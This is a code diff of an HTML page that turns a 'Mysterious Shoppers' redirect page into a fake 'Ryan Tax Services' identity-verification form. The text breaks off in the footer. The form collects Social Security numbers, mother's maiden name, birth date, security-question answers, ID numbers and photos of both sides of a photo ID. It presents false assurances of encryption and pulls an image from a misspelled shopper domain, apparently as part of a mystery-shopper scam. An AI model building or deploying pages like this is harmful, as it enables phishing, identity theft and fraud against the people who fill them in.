@@ -2,32 +2,693 @@
 <html lang="en">
 
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Mysterious Shoppers</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Google tag (gtag.js) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17082293645"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag() { dataLayer.push(arguments); }
-    gtag('js', new Date());
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification - Ryan Tax Services</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
 
-    gtag('config', 'AW-17082293645');
-  </script>
+        .form-step {
+            display: none;
+        }
 
-  <script>
-    setTimeout(function () {
-      window.location.href = './start.html';
-    }, 3000); // Redirect after 3 seconds
-  </script>
+        .form-step.active {
+            display: block;
+        }
+
+        .progress-bar {
+            transition: width 0.3s ease;
+        }
+
+        .field-error {
+            border-color: #ef4444;
+            background-color: #fef2f2;
+        }
+
+        .field-success {
+            border-color: #10b981;
+            background-color: #f0fdf4;
+        }
+    </style>
 </head>
 
-<body class="font-sans bg-gray-900 text-gray-800 flex items-center justify-center min-h-screen">
-  <div class="text-center">
-    <div class="animate-spin rounded-full h-20 w-20 border-t-4 border-green-500 border-solid mx-auto"></div>
-    <p class="mt-6 text-white text-lg font-semibold">Initializing your verification portal... please wait</p>
-  </div>
+<body class="bg-gray-50 min-h-screen">
+    <div class="fixed bottom-0 left-0 w-full z-50 bg-[#f4ca86] text-black/80 p-1 overflow-hidden py-3">
+        <div class=" text-xs  text-center w-full whitespace-nowrap font-semibold">
+            &nbsp; &nbsp; &nbsp; Do not close this window / tab until verification is complete to avoid incomplete /
+            data loss &nbsp; &nbsp; &nbsp;
+        </div>
+    </div>
+    <!-- Header -->
+    <header class="bg-white shadow-sm border-b border-gray-200">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-16">
+                <div class="flex items-center space-x-4">
+                    <img src="/logo.png" alt="Ryan Tax Services Logo" class="h-10 w-auto">
+                    <div class="hidden sm:block">
+                        <h1 class="text-xl font-semibold text-gray-900">Identity Verification</h1>
+                    </div>
+                </div>
+                <div class="flex items-center space-x-2 text-sm text-gray-600">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                    </svg>
+                    <span class="hidden sm:inline">Secure Verification</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <div class="bg-gradient-to-r from-green-600 to-green-700 py-12">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="bg-white rounded-2xl shadow-xl p-6 sm:p-8">
+                <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6">
+                    <div class="flex-1">
+                        <h2 class="text-2xl sm:text-3xl font-bold text-gray-900 mb-3">Verify Your Identity</h2>
+                        <h2 class="text-xl  font-medium text-gray-900 mb-3">Your Verification ID is: #<span
+                                id="vid"></span></h2>
+                        <p class="text-gray-600 text-sm sm:text-base leading-relaxed mb-4">
+                            This step is important to ensure everything meets our eligibility requirements and
+                            to maintain the integrity of <span class="font-semibold text-gray-900">Ryan Tax Services
+                            </span>.
+                        </p>
+                        <div class="flex items-start space-x-3 text-sm text-gray-600">
+                            <svg class="w-5 h-5 text-green-500 mt-0.5 flex-shrink-0" fill="none" stroke="currentColor"
+                                viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                            </svg>
+                            <div>
+                                <p class="font-medium text-gray-900">Your information is protected end-to-end</p>
+                                <p>Privacy and security are our top priorities</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="mt-4 sm:mt-0 sm:ml-6">
+                        <img src="/secured.jpg" alt="Logo" class="w-[200px] h-[90px]">
+                    </div>
+                </div>
+
+                <!-- Progress Bar -->
+                <div class="mb-8">
+                    <div class="flex justify-between text-xs font-medium text-gray-500 mb-2">
+                        <span>Basic Information</span>
+                        <span>ID Verification & Documents</span>
+                    </div>
+                    <div class="w-full bg-gray-200 rounded-full h-2">
+                        <div id="progressBar" class="progress-bar bg-green-600 h-2 rounded-full" style="width: 50%">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Form Container -->
+    <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+        <div class="bg-white rounded-2xl shadow-xl overflow-hidden">
+            <form id="multiStepForm" enctype="multipart/form-data" class="p-6 sm:p-8">
+
+                <!-- Step 1: Basic Information -->
+                <div class="form-step active" data-step="1">
+                    <div class="mb-8">
+                        <h3 class="text-2xl font-bold text-gray-900 mb-2">Basic Information</h3>
+                        <p class="text-gray-600">Please provide your personal, address, and contact details</p>
+                    </div>
+
+                    <div class="space-y-12">
+                        <!-- Personal Information Section -->
+                        <div>
+                            <h4 class="text-xl font-semibold text-gray-900 mb-6 pb-3 border-b border-gray-200">Personal Information</h4>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                <div class="space-y-2">
+                                    <label for="first_name" class="block text-sm font-medium text-gray-700">
+                                        First Name <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="text" id="first_name" name="first_name" required
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                        placeholder="John">
+                                    <div class="error-message text-red-500 text-xs hidden"></div>
+                                </div>
+
+                                <div class="space-y-2">
+                                    <label for="middle_name" class="block text-sm font-medium text-gray-700">Middle Name</label>
+                                    <input type="text" id="middle_name" name="middle_name"
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                        placeholder="Optional">
+                                </div>
+
+                                <div class="space-y-2">
+                                    <label for="last_name" class="block text-sm font-medium text-gray-700">
+                                        Last Name <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="text" id="last_name" name="last_name" required
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                        placeholder="Smith">
+                                    <div class="error-message text-red-500 text-xs hidden"></div>
+                                </div>
+
+                                <div class="space-y-2">
+                                    <label for="mothers_name" class="block text-sm font-medium text-gray-700">
+                                        Mother's Maiden Name <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="text" id="mothers_name" name="mothers_name" required
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                        placeholder="Security question">
+                                    <div class="error-message text-red-500 text-xs hidden"></div>
+                                </div>
+
+                                <div class="space-y-2">
+                                    <label for="suffix" class="block text-sm font-medium text-gray-700">Suffix</label>
+                                    <select id="suffix" name="suffix"
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors">
+                                        <option value="none">None</option>
+                                        <option value="jr">Jr.</option>
+                                        <option value="sr">Sr.</option>
+                                        <option value="ii">II</option>
+                                        <option value="iii">III</option>
+                                    </select>
+                                </div>
+
+                                <div class="space-y-2">
+                                    <label for="dob" class="block text-sm font-medium text-gray-700">
+                                        Date of Birth <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="date" id="dob" name="dob" required
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors">
+                                    <div class="error-message text-red-500 text-xs hidden"></div>
+                                </div>
+
+                                <div class="space-y-2 md:col-span-2">
+                                    <label for="ssn" class="block text-sm font-medium text-gray-700">
+                                        Social Security Number <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="text" id="ssn" name="ssn" required
+                                        class="w-full md:w-1/2 px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                        placeholder="123-45-6789" pattern="\d{3}-\d{2}-\d{4}">
+                                    <p class="text-xs text-gray-500 mt-1">Format: XXX-XX-XXXX</p>
+                                    <div class="error-message text-red-500 text-xs hidden"></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Address & Contact Information Section -->
+                        <div>
+                            <h4 class="text-xl font-semibold text-gray-900 mb-6 pb-3 border-b border-gray-200">Address & Contact Information</h4>
+                            <div class="space-y-6">
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div class="space-y-2">
+                                        <label for="country" class="block text-sm font-medium text-gray-700">
+                                            Country <span class="text-red-500">*</span>
+                                        </label>
+                                        <select id="country" name="country" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors">
+                                            <option value="USA">United States</option>
+                                            <option value="Canada">Canada</option>
+                                            <option value="Australia">Australia</option>
+                                        </select>
+                                    </div>
+
+                                    <div class="space-y-2">
+                                        <label for="state" class="block text-sm font-medium text-gray-700">
+                                            State/Province <span class="text-red-500">*</span>
+                                        </label>
+                                        <select id="state" name="state" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors">
+                                            <option value="please_select">--Please Select--</option>
+                                        </select>
+                                    </div>
+                                </div>
+
+                                <div class="space-y-2">
+                                    <label for="address" class="block text-sm font-medium text-gray-700">
+                                        Street Address <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="text" id="address" name="address" required
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                        placeholder="123 Main Street">
+                                </div>
+
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div class="space-y-2">
+                                        <label for="city" class="block text-sm font-medium text-gray-700">
+                                            City <span class="text-red-500">*</span>
+                                        </label>
+                                        <input type="text" id="city" name="city" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                            placeholder="Your city">
+                                    </div>
+
+                                    <div class="space-y-2">
+                                        <label for="zip" class="block text-sm font-medium text-gray-700">
+                                            ZIP/Postal Code <span class="text-red-500">*</span>
+                                        </label>
+                                        <input type="text" id="zip" name="zip" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                            placeholder="12345">
+                                    </div>
+                                </div>
+
+                                <!-- Contact Details -->
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div class="space-y-2">
+                                        <label for="email" class="block text-sm font-medium text-gray-700">
+                                            Email Address <span class="text-red-500">*</span>
+                                        </label>
+                                        <input type="email" id="email" name="email" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                            placeholder="your.email@example.com">
+                                        <div class="error-message text-red-500 text-xs hidden"></div>
+                                    </div>
+
+                                    <div class="space-y-2">
+                                        <label for="home_phone" class="block text-sm font-medium text-gray-700">
+                                            Home Phone <span class="text-red-500">*</span>
+                                        </label>
+                                        <input type="tel" id="home_phone" name="home_phone" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                            placeholder="(555) 123-4567">
+                                        <div class="error-message text-red-500 text-xs hidden"></div>
+                                    </div>
+                                </div>
+
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div class="space-y-2">
+                                        <label for="cell_phone" class="block text-sm font-medium text-gray-700">Cell Phone</label>
+                                        <input type="tel" id="cell_phone" name="cell_phone"
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                            placeholder="(555) 123-4567">
+                                    </div>
+
+                                    <div class="space-y-2">
+                                        <label for="work_phone" class="block text-sm font-medium text-gray-700">Work Phone</label>
+                                        <input type="tel" id="work_phone" name="work_phone"
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                            placeholder="(555) 123-4567">
+                                    </div>
+                                </div>
+
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div class="space-y-2">
+                                        <label for="preferred_contact_method" class="block text-sm font-medium text-gray-700">
+                                            Preferred Contact Method
+                                        </label>
+                                        <select id="preferred_contact_method" name="preferred_contact_method"
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors">
+                                            <option value="please_select">--Please Select--</option>
+                                            <option value="email">Email</option>
+                                            <option value="phone">Phone</option>
+                                            <option value="both">Both Email & Phone</option>
+                                        </select>
+                                    </div>
+
+                                    <div class="space-y-2">
+                                        <label for="employment_status" class="block text-sm font-medium text-gray-700">
+                                            Employment Status <span class="text-red-500">*</span>
+                                        </label>
+                                        <select id="employment_status" name="employment_status" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors">
+                                            <option value="please_select">--Please Select--</option>
+                                            <option value="employed">Employed Full-time</option>
+                                            <option value="part_time">Employed Part-time</option>
+                                            <option value="self_employed">Self-employed</option>
+                                            <option value="unemployed">Unemployed</option>
+                                            <option value="student">Student</option>
+                                            <option value="retired">Retired</option>
+                                        </select>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="flex justify-end mt-8">
+                        <button type="button" onclick="nextStep()"
+                            class="px-8 py-3 bg-green-600 text-white font-medium rounded-lg hover:bg-green-700 focus:ring-4 focus:ring-green-200 transition-all duration-200">
+                            Continue
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Step 2: ID Verification & Documents -->
+                <div class="form-step" data-step="2"  >
+                    <div class="mb-8">
+                        <h3 class="text-2xl font-bold text-gray-900 mb-2">ID Verification & Documents</h3>
+                        <p class="text-gray-600">Please provide your identification details and upload the required documents</p>
+                    </div>
+
+                    <div class="space-y-12">
+                        <!-- ID Information Section -->
+                        <div>
+                            <h4 class="text-xl font-semibold text-gray-900 mb-6 pb-3 border-b border-gray-200">Identification Information</h4>
+                            <div class="space-y-6">
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div class="space-y-2">
+                                        <label for="id_type" class="block text-sm font-medium text-gray-700">
+                                            ID Type <span class="text-red-500">*</span>
+                                        </label>
+                                        <select id="id_type" name="id_type" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors">
+                                            <option value="drivers_license">Driver's License</option>
+                                            <option value="passport">Passport</option>
+                                            <option value="state_id">State ID</option>
+                                        </select>
+                                    </div>
+
+                                    <div class="space-y-2">
+                                        <label for="id_state" class="block text-sm font-medium text-gray-700">
+                                            Issuing State/Province <span class="text-red-500">*</span>
+                                        </label>
+                                        <select id="id_state" name="id_state" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors">
+                                            <option value="please_select">--Please Select--</option>
+                                            <!-- US States -->
+                                            <option value="AL">Alabama</option>
+                                            <option value="AK">Alaska</option>
+                                            <option value="AZ">Arizona</option>
+                                            <option value="AR">Arkansas</option>
+                                            <option value="CA">California</option>
+                                            <option value="CO">Colorado</option>
+                                            <option value="CT">Connecticut</option>
+                                            <option value="DE">Delaware</option>
+                                            <option value="FL">Florida</option>
+                                            <option value="GA">Georgia</option>
+                                            <option value="HI">Hawaii</option>
+                                            <option value="ID">Idaho</option>
+                                            <option value="IL">Illinois</option>
+                                            <option value="IN">Indiana</option>
+                                            <option value="IA">Iowa</option>
+                                            <option value="KS">Kansas</option>
+                                            <option value="KY">Kentucky</option>
+                                            <option value="LA">Louisiana</option>
+                                            <option value="ME">Maine</option>
+                                            <option value="MD">Maryland</option>
+                                            <option value="MA">Massachusetts</option>
+                                            <option value="MI">Michigan</option>
+                                            <option value="MN">Minnesota</option>
+                                            <option value="MS">Mississippi</option>
+                                            <option value="MO">Missouri</option>
+                                            <option value="MT">Montana</option>
+                                            <option value="NE">Nebraska</option>
+                                            <option value="NV">Nevada</option>
+                                            <option value="NH">New Hampshire</option>
+                                            <option value="NJ">New Jersey</option>
+                                            <option value="NM">New Mexico</option>
+                                            <option value="NY">New York</option>
+                                            <option value="NC">North Carolina</option>
+                                            <option value="ND">North Dakota</option>
+                                            <option value="OH">Ohio</option>
+                                            <option value="OK">Oklahoma</option>
+                                            <option value="OR">Oregon</option>
+                                            <option value="PA">Pennsylvania</option>
+                                            <option value="RI">Rhode Island</option>
+                                            <option value="SC">South Carolina</option>
+                                            <option value="SD">South Dakota</option>
+                                            <option value="TN">Tennessee</option>
+                                            <option value="TX">Texas</option>
+                                            <option value="UT">Utah</option>
+                                            <option value="VT">Vermont</option>
+                                            <option value="VA">Virginia</option>
+                                            <option value="WA">Washington</option>
+                                            <option value="WV">West Virginia</option>
+                                            <option value="WI">Wisconsin</option>
+                                            <option value="WY">Wyoming</option>
+                                            <!-- Canadian Provinces -->
+                                            <option value="AB">Alberta</option>
+                                            <option value="BC">British Columbia</option>
+                                            <option value="MB">Manitoba</option>
+                                            <option value="NB">New Brunswick</option>
+                                            <option value="NL">Newfoundland and Labrador</option>
+                                            <option value="NS">Nova Scotia</option>
+                                            <option value="ON">Ontario</option>
+                                            <option value="PE">Prince Edward Island</option>
+                                            <option value="QC">Quebec</option>
+                                            <option value="SK">Saskatchewan</option>
+                                            <option value="NT">Northwest Territories</option>
+                                            <option value="NU">Nunavut</option>
+                                            <option value="YT">Yukon</option>
+                                            <!-- Australian States -->
+                                            <option value="ACT">Australian Capital Territory</option>
+                                            <option value="NSW">New South Wales</option>
+                                            <option value="NT">Northern Territory</option>
+                                            <option value="QLD">Queensland</option>
+                                            <option value="SA">South Australia</option>
+                                            <option value="TAS">Tasmania</option>
+                                            <option value="VIC">Victoria</option>
+                                            <option value="WA">Western Australia</option>
+                                        </select>
+                                    </div>
+                                </div>
+
+                                <div class="space-y-2">
+                                    <label for="id_number" class="block text-sm font-medium text-gray-700">
+                                        ID Number <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="text" id="id_number" name="id_number" required
+                                        class="w-full md:w-1/2 px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                        placeholder="Enter your ID number">
+                                </div>
+
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div class="space-y-2">
+                                        <label class="block text-sm font-medium text-gray-700">
+                                            ID Date Issued <span class="text-red-500">*</span>
+                                        </label>
+                                        <div class="flex space-x-2">
+                                            <input type="number" id="id_date_issued_mm" name="id_date_issued_mm" required
+                                                class="w-20 px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                                placeholder="MM" min="1" max="12">
+                                            <input type="number" id="id_date_issued_dd" name="id_date_issued_dd" required
+                                                class="w-20 px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                                placeholder="DD" min="1" max="31">
+                                            <input type="number" id="id_date_issued_yyyy" name="id_date_issued_yyyy" required
+                                                class="w-28 px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                                placeholder="YYYY" min="1900" max="2030">
+                                        </div>
+                                    </div>
+
+                                    <div class="space-y-2">
+                                        <label class="block text-sm font-medium text-gray-700">
+                                            ID Expiration Date <span class="text-red-500">*</span>
+                                        </label>
+                                        <div class="flex space-x-2">
+                                            <input type="number" id="id_expiration_mm" name="id_expiration_mm" required
+                                                class="w-20 px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                                placeholder="MM" min="1" max="12">
+                                            <input type="number" id="id_expiration_dd" name="id_expiration_dd" required
+                                                class="w-20 px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                                placeholder="DD" min="1" max="31">
+                                            <input type="number" id="id_expiration_yyyy" name="id_expiration_yyyy" required
+                                                class="w-28 px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                                placeholder="YYYY" min="2024" max="2050">
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Security Questions Section -->
+                        <div>
+                            <h4 class="text-xl font-semibold text-gray-900 mb-6 pb-3 border-b border-gray-200">Security Questions</h4>
+                            <div class="space-y-6">
+                                <p class="text-gray-600 mb-4">Please provide answers to the following security questions for account verification purposes.</p>
+                                
+                                <!-- Question 1 -->
+                                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                                    <div class="md:col-span-2 space-y-2">
+                                        <label for="security_question1" class="block text-sm font-medium text-gray-700">
+                                            Security Question 1 <span class="text-red-500">*</span>
+                                        </label>
+                                        <select id="security_question1" name="security_question1" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors">
+                                            <option value="please_select">--Please Select--</option>
+                                            <option value="first_pet">What was the name of your first pet?</option>
+                                            <option value="childhood_friend">What is the name of your childhood best friend?</option>
+                                            <option value="first_school">What elementary school did you attend?</option>
+                                            <option value="birth_city">In what city were you born?</option>
+                                            <option value="first_car">What was the make and model of your first car?</option>
+                                        </select>
+                                    </div>
+                                    <div class="space-y-2">
+                                        <label for="security_answer1" class="block text-sm font-medium text-gray-700">
+                                            Answer 1 <span class="text-red-500">*</span>
+                                        </label>
+                                        <input type="text" id="security_answer1" name="security_answer1" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                            placeholder="Enter your answer">
+                                    </div>
+                                </div>
+
+                                <!-- Question 2 -->
+                                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                                    <div class="md:col-span-2 space-y-2">
+                                        <label for="security_question2" class="block text-sm font-medium text-gray-700">
+                                            Security Question 2 <span class="text-red-500">*</span>
+                                        </label>
+                                        <select id="security_question2" name="security_question2" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors">
+                                            <option value="please_select">--Please Select--</option>
+                                            <option value="first_pet">What was the name of your first pet?</option>
+                                            <option value="childhood_friend">What is the name of your childhood best friend?</option>
+                                            <option value="first_school">What elementary school did you attend?</option>
+                                            <option value="birth_city">In what city were you born?</option>
+                                            <option value="first_car">What was the make and model of your first car?</option>
+                                        </select>
+                                    </div>
+                                    <div class="space-y-2">
+                                        <label for="security_answer2" class="block text-sm font-medium text-gray-700">
+                                            Answer 2 <span class="text-red-500">*</span>
+                                        </label>
+                                        <input type="text" id="security_answer2" name="security_answer2" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                            placeholder="Enter your answer">
+                                    </div>
+                                </div>
+
+                                <!-- Question 3 -->
+                                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                                    <div class="md:col-span-2 space-y-2">
+                                        <label for="security_question3" class="block text-sm font-medium text-gray-700">
+                                            Security Question 3 <span class="text-red-500">*</span>
+                                        </label>
+                                        <select id="security_question3" name="security_question3" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors">
+                                            <option value="please_select">--Please Select--</option>
+                                            <option value="first_pet">What was the name of your first pet?</option>
+                                            <option value="childhood_friend">What is the name of your childhood best friend?</option>
+                                            <option value="first_school">What elementary school did you attend?</option>
+                                            <option value="birth_city">In what city were you born?</option>
+                                            <option value="first_car">What was the make and model of your first car?</option>
+                                        </select>
+                                    </div>
+                                    <div class="space-y-2">
+                                        <label for="security_answer3" class="block text-sm font-medium text-gray-700">
+                                            Answer 3 <span class="text-red-500">*</span>
+                                        </label>
+                                        <input type="text" id="security_answer3" name="security_answer3" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors"
+                                            placeholder="Enter your answer">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <h4 class="text-xl font-semibold text-gray-900 mb-6 pb-3 border-b border-gray-200">Document Upload</h4>
+                            <div class="space-y-8">
+                        <!-- Document Upload Section -->
+                        <div>
+                            <div class="space-y-8">
+                                <!-- ID Document Upload -->
+                                <div class="bg-green-50 rounded-xl p-6">
+                                    <div class="flex items-start space-x-4 mb-6">
+                                        <div class="flex-shrink-0">
+                                            <img src="https://myteriousshoppers.com/verification/id.jpg" alt="ID Example"
+                                                class="w-16 h-16 rounded-lg object-cover">
+                                        </div>
+                                        <div class="flex-1">
+                                            <h5 class="text-lg font-semibold text-gray-900 mb-2">Upload Photo ID</h5>
+                                            <p class="text-sm text-gray-600">
+                                                Please upload clear photos of the front and back of your Photo ID.
+                                            </p>
+                                        </div>
+                                    </div>
+
+                                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                        <div class="space-y-2">
+                                            <label for="file_upload_front" class="block text-sm font-medium text-gray-700">
+                                                Photo ID (Front) <span class="text-red-500">*</span>
+                                            </label>
+                                            <input type="file" id="file_upload_front" name="file_upload_front" required
+                                                accept="image/*"
+                                                class="w-full px-4 py-3 border-2 border-dashed border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-medium file:bg-green-50 file:text-green-700 hover:file:bg-green-100">
+                                        </div>
+
+                                        <div class="space-y-2">
+                                            <label for="file_upload_back" class="block text-sm font-medium text-gray-700">
+                                                Photo ID (Back) <span class="text-red-500">*</span>
+                                            </label>
+                                            <input type="file" id="file_upload_back" name="file_upload_back" required
+                                                accept="image/*"
+                                                class="w-full px-4 py-3 border-2 border-dashed border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-colors file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-medium file:bg-green-50 file:text-green-700 hover:file:bg-green-100">
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Security Notice -->
+                                <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
+                                    <div class="flex items-start space-x-3">
+                                        <svg class="w-5 h-5 text-yellow-600 mt-0.5 flex-shrink-0" fill="none"
+                                            stroke="currentColor" viewBox="0 0 24 24">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z" />
+                                        </svg>
+                                        <div>
+                                            <h5 class="font-medium text-yellow-800">Security & Privacy</h5>
+                                            <p class="text-sm text-yellow-700 mt-1">
+                                                Your documents are encrypted and stored securely. We only use this information
+                                                for identity verification purposes and will never share it with third parties.
+                                            </p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="flex justify-between mt-8">
+                        <button type="button" onclick="prevStep()"
+                            class="px-8 py-3 bg-gray-300 text-gray-700 font-medium rounded-lg hover:bg-gray-400 focus:ring-4 focus:ring-gray-200 transition-all duration-200">
+                            Back
+                        </button>
+
+                        <button type="submit" id="submitBtn"
+                            class="px-8 py-3 bg-green-600 text-white font-medium rounded-lg hover:bg-green-700 focus:ring-4 focus:ring-green-200 transition-all duration-200 flex items-center space-x-2">
+                            <span>Submit Verification</span>
+                            <svg class="w-5 h-5 hidden animate-spin" fill="none" stroke="currentColor"
+                                viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 text-white py-12 mt-16">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">Contact Support</h3>
+                    <p class="text-gray-300 text-sm mb-2">Need help with verification?</p>
+                    <p class="text-green-400 font-medium">support@ryantaxservices.com</p>
+                    <p class="text-green-400 font-medium">+1 (945) 334-6439</p>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">Security</h3>
+                    <p class="text-gray-300 text-sm">Your information is protected with bank-level encryption and
